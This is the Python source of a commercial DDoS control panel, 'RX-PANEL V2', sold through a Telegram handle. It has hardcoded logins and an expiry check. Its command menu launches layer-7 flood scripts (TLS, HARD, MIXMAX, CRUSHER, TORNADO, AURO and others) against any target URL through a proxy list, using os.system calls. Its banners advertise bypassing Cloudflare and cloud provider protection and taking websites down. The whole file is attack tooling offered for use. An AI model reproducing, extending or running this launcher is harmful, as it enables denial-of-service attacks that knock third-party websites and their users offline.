import socket
import os
import requests
import random
import getpass
import time
import sys
from datetime import datetime, timedelta
from pystyle import Colors, Colorate

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_expiry():
    start_date = datetime(2024, 8, 24)  # Set the start date (year, month, day)
    expiry_date = start_date + timedelta(days=999999)  
    today = datetime.now()
    remaining_days = (expiry_date - today).days
    
    if today >= expiry_date:
        print(Colorate.Diagonal(Colors.red_to_green, "Your access has expired. Please contact support for renewal. CONTACT: @unidentified_gojo"))
        sys.exit(1)
    
    return remaining_days

def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org').text
    except requests.RequestException:
        ip = "Unable to fetch IP"
    return ip

proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si(vvip):
    remaining_days = check_expiry()
    public_ip = get_public_ip()
    access_level = "VVIP" if vvip else "USER"
    print(Colorate.Diagonal(Colors.blue_to_cyan, f"IP Address: {public_ip} | Days Remaining: {remaining_days} | WELCOME TO RXV2 | USER: {access_level} | PLAN: VVIP | Proxy: {bots_str} | USE AND BE HAPPY"))
    print("")

def layer7(vvip):
    clear()
    si(vvip)
    print(Colorate.Horizontal(Colors.blue_to_cyan, '''
  
█████  ██     ██ █████   ███     █    █ ██████ █
█    █   ██ ██    █   █  █  █    ██   █ █      █
█     █    █      ████  ██████   █ █  █ █████  █
█    █  ███  ███  █     █     █  █  █ █ █      █
█████  ██      ██ █    █       █ █   ██ ██████ ███████
               
                LAYER7 METHODS
                
          
!TLS - POWERFUL TLS METHOD BYPASS AMAZON, GOOGLE CLOUD SHEILD, CLOUDFLARE ISP
!ACK - BYPASS ANY PROTECTION WITH HIGH RPS SEND
!HTTPS-JET - SEND ATTACK WITH HTTPS-FLOOD
!HARD - SEND HIGH REQUEST 
!MIXMAX - ATTACK WEBSITE UNTIL DOWN
!CRUSHER - TAKE DOWN LOW QUALITY WEBSITE
!TORNADO - NEW POWERFUL ATTACK METHOD
!AURO - AUROLOGiC Powerful METHOD (GOJO ONLY)
HOW TO USE
AURO https://target.com 100 10 10 proxy.txt 
'''))

def menu(vvip):
    clear()
    remaining_days = check_expiry()
    public_ip = get_public_ip()
    access_level = "VVIP" if vvip else "USER"
    print(Colorate.Diagonal(Colors.blue_to_cyan, f"IP Address: {public_ip} | Days Remaining: {remaining_days} | WELCOME TO RXV2 | USER: {access_level} | PLAN: VVIP | Proxy: {bots_str} | Use and FU** WEBSITES"))
    print("")
    banner = '''
  
█████  ██     ██ █████   ███     █    █ ██████ █
█    █   ██ ██    █   █  █  █    ██   █ █      █
█     █    █      ████  ██████   █ █  █ █████  █
█    █  ███ ███   █     █     █  █  █ █ █      █
█████  ██      ██ █    █       █ █   ██ ██████ ███████


Type Layer7 or l7, To See Layer7 Methods⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.blue_to_cyan, banner))

def main(vvip):
    menu(vvip)
    while(True):
        cnc = input(Colorate.Diagonal(Colors.blue_to_cyan, "root@DX-panel#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7(vvip)
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main(vvip)
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'node TLS.js {host} {duration} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: TLS https://example.com 120')
                
        elif "HARD" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'node HARD.js {host} {duration} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: HARD https://example.com 120')
                
        elif "MIXMAX" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'node MIXMAX.js {host} {duration} 100 10')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: MIXMAX https://example.com 120')             
                
        elif "CRUSHER" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'go run CRUSHER.go {host} 9999 get {duration} nil')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: CRUSHER https://example.com 120')
                
        elif "HTTP-JET" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'node HTTP-JET.js {host} {duration} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: HTTP-JET https://example.com 120')
                
        elif "ACK" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'node ACK.js {host} {duration} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: ACK https://example.com 120')

        elif "TORNADO" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'node TORNADO.js {host} {duration} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: TORNADO https://example.com 120')
                
        elif "AURO" in cnc:
            try: 
                host = cnc.split()[1]
                duration = cnc.split()[2]
                print(f"Attacking {host} for {duration} seconds")
                os.system(f'node AURO.js {host} {duration} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME')
                print('Example: AURO https://example.com 120 10 proxy.txt')

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.blue_to_cyan, ''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
MORE - CONTACT @unidentified_gojo ON TELEGRAM                                     
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print(f"Command: [ {cmmnd} ] Not Found!")
            except IndexError:
                pass

def login():
    clear()
    vvip_user = "u_gojo"
    vvip_passwd = "2343"
    user = "gojo"
    passwd = "isninyb"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if (username != user and username != vvip_user) or password != passwd:
        print("")
        print(Colorate.Horizontal(Colors.blue_to_cyan, ''"Password/Username is incorrect. BUY subscription: @unidenified_gojo from telegram"))
        sys.exit(1)
    elif username == user or username == vvip_user:
        public_ip = get_public_ip()
        access_level = "VVIP" if username == vvip_user else "USER"
        print(Colorate.Diagonal(Colors.blue_to_cyan, f"WELCOME TO RX-PANEL V2 | Your IP: {public_ip} | Access Level: {access_level}"))
        time.sleep(0.3)
        main(username == vvip_user)

login()
